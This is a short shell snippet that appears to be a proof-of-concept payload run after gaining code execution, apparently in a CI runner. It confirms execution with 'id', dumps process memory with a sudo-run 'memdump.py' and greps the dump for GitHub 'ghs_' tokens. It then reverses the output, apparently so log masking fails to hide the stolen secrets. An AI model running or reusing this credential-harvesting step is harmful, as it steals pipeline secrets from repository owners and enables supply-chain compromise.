echo "Code execution here.."
id 1>&2 
sudo python3 memdump.py | tr -d '\0' | grep -aoE 'ghs_[0-9A-Za-z]{20,}' | sort -u | rev
